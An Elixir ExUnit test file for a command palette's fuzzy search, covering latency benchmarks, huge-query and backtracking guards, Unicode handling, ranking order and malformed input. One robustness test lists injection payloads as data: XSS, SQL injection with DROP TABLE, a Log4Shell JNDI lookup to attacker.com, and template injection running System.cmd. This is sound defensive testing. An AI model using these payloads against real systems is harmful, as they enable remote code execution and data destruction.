defmodule IexCodeWeb.Challengers.ChallengerM43EmpiricalTest do
  use ExUnit.Case, async: false

  alias IexCodeWeb.CommandPalette

  # ============================================================================
  # Fixtures & Synthetic Datasets
  # ============================================================================
  setup_all do
    # Generate 2,000 realistic project file paths across diverse directory trees
    synthetic_files =
      for i <- 1..2000 do
        case rem(i, 6) do
          0 ->
            "lib/iex_code_web/live/workspace_live/views/dashboard_view_#{i}.ex"

          1 ->
            "apps/billing/lib/domain/services/billing/payment_processor_service_#{i}.ex"

          2 ->
            "test/iex_code/autonomous_swarm/orchestration_pipeline_worker_#{i}_test.exs"

          3 ->
            "assets/js/components/monaco_inline_editor_buffer_manager_#{i}.ts"

          4 ->
            "config/deploy/kubernetes/helm/charts/microservice_cluster_node_#{i}.yaml"

          5 ->
            "deeply/nested/subsystem/core/infrastructure/adapter/cache/redis_cluster_connector_#{i}.ex"
        end
      end

    # Generate 100 sessions
    synthetic_sessions =
      for i <- 1..100 do
        %{
          id: "sess-#{i}",
          title: "Architecture & Refactoring Session #{i}",
          message_count: rem(i * 7, 50),
          model_name: "claude-3-7-sonnet",
          updated_at: DateTime.utc_now()
        }
      end

    # Generate 50 swarms
    synthetic_swarms =
      for i <- 1..50 do
        %{
          id: "swarm-run-#{i}",
          objective: "Autonomous pipeline test verification and patch application ##{i}",
          status: Enum.at(["queued", "running", "completed", "failed"], rem(i, 4)),
          mode: "swarm",
          progress: rem(i * 13, 100),
          input_tokens: i * 500,
          output_tokens: i * 250,
          agent_count: 4
        }
      end

    # Generate 50 models
    synthetic_models =
      for i <- 1..50 do
        %{
          id: "custom-model-v#{i}",
          name: "DeepReason Model-v#{i} Spec",
          provider: Enum.at(["anthropic", "openai", "google", "ollama"], rem(i, 4)),
          local?: rem(i, 2) == 0,
          endpoint: "https://api.model-provider-#{i}.com/v1"
        }
      end

    # Generate 100 git branches
    synthetic_branches =
      for i <- 1..100 do
        %{
          name: "feature/swarm-agent-collaboration-pipeline-#{i}",
          current?: i == 1,
          upstream: "origin/feature/swarm-agent-collaboration-pipeline-#{i}"
        }
      end

    # Generate 50 terminal commands
    synthetic_terminal =
      for i <- 1..50 do
        %{
          command: "mix test.interactive --suite=domain_#{i} --trace",
          desc: "Execute ExUnit interactive trace runner for domain module ##{i}"
        }
      end

    extra = %{
      swarms: synthetic_swarms,
      models: synthetic_models,
      branches: synthetic_branches,
      terminal_commands: synthetic_terminal,
      workspace_root: "/Users/zaali/dev/iex-code"
    }

    %{
      files: synthetic_files,
      sessions: synthetic_sessions,
      extra: extra
    }
  end

  # ============================================================================
  # 1. EMPIRICAL SLA BENCHMARK (< 25.0ms p95 across 2,000 files)
  # ============================================================================
  describe "1. Empirical Performance SLA (< 25ms p95 on 2,000 files)" do
    test "measures 15 varied query types across 2,374 items and enforces p95 < 25.0ms SLA", %{
      files: files,
      sessions: sessions,
      extra: extra
    } do
      total_items =
        length(CommandPalette.actions()) +
          length(CommandPalette.views()) +
          length(files) +
          length(sessions) +
          length(extra.swarms) +
          length(extra.models) +
          length(extra.branches) +
          length(extra.terminal_commands)

      assert total_items in [2374, 2380]

      benchmark_queries = [
        {"Empty query (all items indexed)", ""},
        {"Scoped swarm prefix (@)", "@ pipeline"},
        {"Scoped model prefix ($)", "$ DeepReason"},
        {"Scoped branch prefix (/)", "/ swarm-agent-collaboration"},
        {"Scoped terminal prefix (!)", "! interactive"},
        {"Scoped file prefix (#)", "# payment_processor_service_1200"},
        {"Exact action title (cross-category)", "Run All Tests"},
        {"Exact view title (cross-category)", "Git Changes"},
        {"File basename substring (cross-category)", "payment_processor_service_1500"},
        {"Deep path query (cross-category)", "apps/billing/lib/domain"},
        {"Deeply nested 8-segment path query", "deeply/nested/subsystem/core"},
        {"Word boundary subsequence (cross-category)", "payproc1500"},
        {"Subsequence across path separators", "iexwbview"},
        {"Worst-case non-matching traversal", "zzzzzzzz_nonexistent_token_99999"},
        {"Unicode search in project files", "🚀"}
      ]

      IO.puts("\n" <> String.duplicate("=", 82))
      IO.puts("CHALLENGER UI M4.3: EMPIRICAL LATENCY SLA HARNESS (Total: #{total_items} items)")
      IO.puts(String.duplicate("=", 82))

      results =
        for {label, query} <- benchmark_queries do
          # Warmup run
          _ = CommandPalette.search(query, files, sessions, "all", extra)

          # Sample 30 runs for robust p95 calculation
          durations_us =
            for _ <- 1..30 do
              {us, _} =
                :timer.tc(fn ->
                  CommandPalette.search(query, files, sessions, "all", extra)
                end)

              us
            end

          sorted = Enum.sort(durations_us)
          median_us = Enum.at(sorted, div(length(sorted), 2))
          p95_index = max(0, round(length(sorted) * 0.95) - 1)
          p95_us = Enum.at(sorted, p95_index)
          max_us = List.last(sorted)

          median_ms = Float.round(median_us / 1000, 2)
          p95_ms = Float.round(p95_us / 1000, 2)
          max_ms = Float.round(max_us / 1000, 2)

          status = if p95_ms < 25.0, do: "PASS (<25ms)", else: "FAIL (SLA VIOLATION)"

          IO.puts(
            "  • #{String.pad_trailing(label, 52)} | Med: #{String.pad_leading("#{median_ms}ms", 7)} | p95: #{String.pad_leading("#{p95_ms}ms", 7)} | Max: #{String.pad_leading("#{max_ms}ms", 7)} | #{status}"
          )

          {label, median_ms, p95_ms, max_ms}
        end

      IO.puts(String.duplicate("=", 82) <> "\n")

      for {label, _med, p95, _max} <- results do
        assert p95 < 25.0,
               "Empirical SLA violation on '#{label}': p95 was #{p95}ms (strictly required < 25.0ms)"
      end
    end
  end

  # ============================================================================
  # 2. HUGE QUERY ATTACKS (> 200 CHARS) & DOS DEFENSE
  # ============================================================================
  describe "2. Huge Query Attacks (> 200 chars)" do
    test "unconditionally returns :nomatch for query lengths > 200 across targets from 50 to 4,000 chars (dispatch requirement)" do
      # Warmup JIT compiler and code loader
      _ = CommandPalette.score("warmup_query", "warmup_target")

      target_lengths = [50, 200, 500, 1_000, 4_000]
      query_lengths = [201, 205, 300, 500, 1_000, 4_000]

      for t_len <- target_lengths do
        # Construct target containing matching characters to verify safeguard triggers before scan
        target = String.duplicate("abcdefghijklmnopqrstuvwxyz0123456789_/-.", div(t_len, 40) + 1)
        target = String.slice(target, 0, t_len)

        for q_len <- query_lengths do
          query = String.duplicate("abcdefghij", div(q_len, 10) + 1)
          query = String.slice(query, 0, q_len)

          {time_us, result} =
            :timer.tc(fn ->
              CommandPalette.score(query, target)
            end)

          assert result == :nomatch,
                 "Expected :nomatch for query len #{q_len} against target len #{t_len}, got: #{inspect(result)}"

          # Must return in sub-millisecond (< 1ms), with zero backtracking or degradation
          assert time_us < 1_000,
                 "Huge query evaluation took #{time_us}us for q_len=#{q_len}, t_len=#{t_len}"
        end
      end
    end

    test "boundary length check: 200 chars evaluates normally, 201 chars immediately aborts" do
      # 200 chars exact match
      q_200 = String.duplicate("a", 200)
      t_200 = String.duplicate("a", 200)
      assert {:ok, 1000} = CommandPalette.score(q_200, t_200)

      # 200 chars prefix match
      t_300 = String.duplicate("a", 300)
      assert {:ok, score_200} = CommandPalette.score(q_200, t_300)
      assert score_200 >= 500

      # 201 chars against 201 chars: immediately :nomatch
      q_201 = String.duplicate("a", 201)
      t_201 = String.duplicate("a", 201)
      assert CommandPalette.score(q_201, t_201) == :nomatch

      # 201 chars against 4,000 chars: immediately :nomatch
      t_4000 = String.duplicate("a", 4000)
      assert CommandPalette.score(q_201, t_4000) == :nomatch
    end

    test "CommandPalette.search/5 with > 200 chars against 2,000 files completes well within SLA (< 25ms) and returns []",
         %{
           files: files,
           sessions: sessions,
           extra: extra
         } do
      large_queries = [
        # ~260 chars
        String.duplicate("search_token_", 20),
        # ~425 chars
        String.duplicate("lib/iex_code_web/", 25),
        # ~1050 chars
        String.duplicate("huge_payload_attack_", 50),
        # 4000 chars
        String.duplicate("x", 4000),
        # 50000 chars extreme stress
        String.duplicate("a", 50000)
      ]

      for q <- large_queries do
        {time_us, results} =
          :timer.tc(fn ->
            CommandPalette.search(q, files, sessions, "all", extra)
          end)

        assert results == [], "Expected empty results for huge query (len: #{String.length(q)})"
        # Must execute comfortably within SLA (< 25,000us)
        assert time_us < 25_000,
               "Search took #{time_us / 1000}ms for huge query (len: #{String.length(q)})"
      end
    end
  end

  # ============================================================================
  # 3. PATHOLOGICAL INPUTS, DEEP PATHS, UNICODE & REGEX CHARACTERS
  # ============================================================================
  describe "3. Pathological Inputs, Deep Paths, Unicode & Regex Metacharacters" do
    test "adversarial regex metacharacters execute safely without regex compilation crashes", %{
      files: files,
      sessions: sessions,
      extra: extra
    } do
      regex_tokens = [
        ".*",
        ".+",
        ".*?",
        "+++",
        "***",
        "???",
        "^^^",
        "$$$",
        "\\\\",
        "\\\\\\\\",
        "[a-zA-Z0-9_-]+",
        "(?:[a-z]+|\\d+)",
        "^(lib|test|apps)/.*\\.ex$",
        "(?=.*[0-9])(?=.*[a-z])",
        "\\b\\w+\\b",
        "[{}]",
        "()",
        "[]",
        "|",
        "||",
        "&&",
        "!?$^*+~`"
      ]

      for tok <- regex_tokens do
        # 1. score/2 must not raise
        score_res = CommandPalette.score(tok, "lib/iex_code_web/command_palette.ex")
        assert score_res == :nomatch or match?({:ok, _}, score_res)

        # 2. search/5 must not raise
        results = CommandPalette.search(tok, files, sessions, "all", extra)
        assert is_list(results), "Failed on regex token: #{tok}"
      end
    end

    test "handles null bytes, control characters, quotes, and injection strings safely", %{
      files: files,
      sessions: sessions,
      extra: extra
    } do
      injections = [
        "\0",
        "\\0",
        "\x00",
        "\r\n\t\b\f",
        "<script>alert('pwned')</script>",
        "\"' OR '1'='1' --",
        "'; DROP TABLE sessions; --",
        "${jndi:ldap://attacker.com/a}",
        "{{7*7}}",
        "<%= System.cmd(\"id\", []) %>",
        "```elixir\nIO.puts(:hack)\n```"
      ]

      for inj <- injections do
        res = CommandPalette.search(inj, files, sessions, "all", extra)
        assert is_list(res), "Failed on injection payload: #{inspect(inj)}"
      end
    end

    test "handles deeply nested paths up to 100 segments and 1,000 characters" do
      # Deep path target with 60 levels (~600 chars)
      segments = for i <- 1..60, do: "subsystem_module_#{i}"
      deep_target = Enum.join(segments, "/") <> "/deep_service.ex"

      assert byte_size(deep_target) > 500

      # Query matching basename
      assert {:ok, s_base} = CommandPalette.score("deep_service", deep_target)
      assert s_base > 300

      # Query matching deep subsequence across segments
      assert {:ok, s_sub} = CommandPalette.score("sub1sub60", deep_target)
      assert s_sub > 100

      # 100-segment path
      hundred_segments = for i <- 1..100, do: "d#{i}"
      hundred_target = Enum.join(hundred_segments, "/") <> "/final.ex"

      assert {:ok, s_100} = CommandPalette.score("final", hundred_target)
      assert s_100 > 300

      # Non-matching query on deep path returns :nomatch quickly
      assert CommandPalette.score("nonexistent_service", deep_target) == :nomatch
    end

    test "handles complex multi-byte Unicode, emojis, ZWJ sequences, and RTL scripts" do
      unicode_pairs = [
        {"🚀", "🚀 Launch Swarm Pipeline"},
        {"✨", "✨ AutoFix Studio"},
        {"🔥", "🔥 Run Failing Tests"},
        {"👨‍👩‍👧‍👦", "👨‍👩‍👧‍👦 Team Collaboration Session"},
        {"العربية", "apps/العربية/payment.ex"},
        {"日本語", "lib/日本語/service.ex"},
        {"עברית", "config/עברית/settings.yaml"},
        {"Скрипт", "scripts/Скрипт_build.sh"},
        {"café", "lib/café_menu.ex"},
        {"über", "lib/über_worker.ex"},
        {"naïve", "test/naïve_bayes_test.exs"}
      ]

      for {q, t} <- unicode_pairs do
        assert {:ok, s} = CommandPalette.score(q, t),
               "Failed to match Unicode query #{inspect(q)} in target #{inspect(t)}"

        assert s >= 300
      end

      # Boundary bonus with Unicode delimiters
      assert {:ok, s_delim} = CommandPalette.score("payment", "🚀_payment_service")
      assert s_delim > 300
    end

    test "pathological backtracking patterns complete linearly without exponential blowup" do
      # Pattern: target has many partial matches of query prefix before failing
      # Query: "aaaaab"
      # Target: "aaaaaaaaaaaaaaaaaaaaa...aaaa" (no 'b')
      target_no_b = String.duplicate("a", 3000)
      query_ab = "aaaaab"

      {time_us, result} =
        :timer.tc(fn ->
          CommandPalette.score(query_ab, target_no_b)
        end)

      assert result == :nomatch

      # Linear search with :binary.match should take < 10ms (10,000 microseconds), preventing exponential blowup
      assert time_us < 10_000, "Backtracking pattern took #{time_us}us (expected < 10000us)"

      # Alternating repeats
      # 2000 chars
      target_alt = String.duplicate("abab", 500)
      query_alt = "ababac"

      {time_alt_us, res_alt} =
        :timer.tc(fn ->
          CommandPalette.score(query_alt, target_alt)
        end)

      assert res_alt == :nomatch
      assert time_alt_us < 10_000
    end

    test "strictly rejects inverted character orders (no false positive matches)" do
      refutations = [
        {"cba", "abc"},
        {"zyx", "xyz"},
        {"tsel", "test"},
        {"evillib", "lib_live"},
        {"reganam", "manager"},
        {"edoc_xei", "iex_code"},
        {"tpircs", "script"},
        {"moc", "com"}
      ]

      for {q, t} <- refutations do
        assert CommandPalette.score(q, t) == :nomatch,
               "Inverted query #{inspect(q)} incorrectly matched target #{inspect(t)}"
      end
    end
  end

  # ============================================================================
  # 4. GLOBAL RELEVANCE RANKING IN "ALL" MODE
  # ============================================================================
  describe "4. Global Relevance Ranking in 'all' Mode" do
    test "results in 'all' mode are strictly sorted descending by match score", %{
      files: files,
      sessions: sessions,
      extra: extra
    } do
      test_queries = [
        "test",
        "changes",
        "swarm",
        "run",
        "model",
        "view",
        "service",
        "session",
        "pipeline"
      ]

      for q <- test_queries do
        results = CommandPalette.search(q, files, sessions, "all", extra)
        assert length(results) > 0, "Expected non-empty results for #{q}"

        scores = Enum.map(results, fn item -> Map.get(item, :score, 0) end)

        # Verify monotonicity: score[i] >= score[i+1] for all items
        is_sorted =
          scores
          |> Enum.chunk_every(2, 1, :discard)
          |> Enum.all?(fn [s1, s2] -> s1 >= s2 end)

        assert is_sorted,
               "Results for query '#{q}' were not sorted descending by score! Scores: #{inspect(scores)}"
      end
    end

    test "verifies remediation of regression: 'changes' query places view_changes (score 1000) ahead of start_goal (score 220)",
         %{
           files: files,
           sessions: sessions,
           extra: extra
         } do
      results = CommandPalette.search("changes", files, sessions, "all", extra)
      assert length(results) > 0

      first_item = hd(results)

      # The exact-matching item 'view_changes' must be the top result!
      assert first_item.id == "view_changes",
             "Expected view_changes to be first for 'changes' query, but got: #{first_item.id} (#{first_item.title}) with score #{first_item.score}"

      assert first_item.score == 1000

      # Find start_goal (if present in results) and assert it is ranked after view_changes
      case Enum.find_index(results, &(&1.id == "start_goal")) do
        nil ->
          :ok

        start_goal_index ->
          view_changes_index = Enum.find_index(results, &(&1.id == "view_changes"))

          assert view_changes_index < start_goal_index,
                 "view_changes (index #{view_changes_index}) must precede start_goal (index #{start_goal_index})"
      end
    end

    test "hierarchical score ordering: exact (1000) > prefix (500+) > substring (300+) > subsequence (100+)",
         %{
           sessions: sessions,
           extra: extra
         } do
      # 1. Pure score/2 verification
      assert {:ok, s_exact} = CommandPalette.score("calc", "calc")
      assert s_exact == 1000

      assert {:ok, s_prefix} = CommandPalette.score("calc", "calculator")
      assert s_prefix == 540

      assert {:ok, s_sub_bound} = CommandPalette.score("calc", "super_calc")
      assert s_sub_bound == 390

      # Subsequence match without boundary bonuses
      assert {:ok, s_sub_seq} = CommandPalette.score("calc", "acbaclbc")
      assert s_sub_seq < 300

      assert s_exact > s_prefix
      assert s_prefix > s_sub_bound
      assert s_sub_bound > s_sub_seq

      # 2. In CommandPalette.search across multiple categories
      custom_files = [
        # prefix: score 540
        "lib/calculator.ex",
        # substring with boundary: score 390
        "lib/super_calc.ex",
        # subsequence: score < 300
        "lib/c_a_l_c_helper.ex"
      ]

      # Exact match from views or branches
      custom_extra = Map.put(extra, :branches, [%{name: "calc", current?: false, upstream: ""}])

      results = CommandPalette.search("calc", custom_files, sessions, "all", custom_extra)
      assert length(results) >= 4

      # Verify the branch 'calc' (exact match) is ranked first
      first = hd(results)
      assert first.title == "calc"
      assert first.score == 1000

      # Verify global results are strictly sorted descending by score
      scores = Enum.map(results, & &1.score)
      assert scores == Enum.sort(scores, :desc)
    end

    test "empty query in 'all' mode preserves default categorical layout without sorting", %{
      files: files,
      sessions: sessions,
      extra: extra
    } do
      results = CommandPalette.search("", files, sessions, "all", extra)

      # First items must be actions (default category order: actions, views, files, ...)
      first_few_categories =
        results
        |> Enum.take(8)
        |> Enum.map(& &1.category)

      assert Enum.all?(first_few_categories, &(&1 == :action)),
             "Expected empty query in 'all' mode to start with actions, got: #{inspect(first_few_categories)}"
    end
  end

  # ============================================================================
  # 5. DEFENSIVE GUARDS & INVALIDATION CONDITIONS
  # ============================================================================
  describe "5. Defensive Input Guards & Invalidation Conditions" do
    test "handles nil files, nil sessions, and malformed extra gracefully without exceptions" do
      # All nil
      assert is_list(CommandPalette.search("test", nil, nil, "all", nil))
      assert is_list(CommandPalette.search("", nil, nil, "all", %{}))

      # Malformed extra types
      malformed_extra = %{
        swarms: :not_a_list,
        models: 12345,
        branches: "origin/main",
        terminal_commands: %{invalid: "map"},
        workspace_root: nil
      }

      results =
        CommandPalette.search(
          "test",
          ["file1.ex"],
          [%{id: "s1", title: "s"}],
          "all",
          malformed_extra
        )

      assert is_list(results)

      # Non-binary query
      assert is_list(CommandPalette.search(12345, ["file1.ex"], [], "all", %{}))
      assert is_list(CommandPalette.search(nil, ["file1.ex"], [], "all", %{}))

      # Non-binary category filter
      assert is_list(CommandPalette.search("test", ["file1.ex"], [], :atom_filter, %{}))
      assert is_list(CommandPalette.search("test", ["file1.ex"], [], nil, %{}))
    end

    test "unknown category filter returns empty list" do
      assert CommandPalette.search("test", ["file1.ex"], [], "nonexistent_category", %{}) == []
      assert CommandPalette.search("test", ["file1.ex"], [], "admin_hacks", %{}) == []
    end
  end
end
